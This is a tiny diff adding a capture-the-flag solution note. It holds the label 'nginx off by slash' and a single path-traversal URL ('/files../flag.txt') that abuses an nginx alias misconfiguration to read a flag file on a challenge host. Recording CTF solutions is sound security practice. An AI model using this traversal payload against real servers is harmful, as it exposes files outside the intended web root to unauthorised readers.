@@ -1,0 +1,3 @@
+nginx off by slash
+
+https://engine-x.ictf.iciaran.com/files../flag.txt
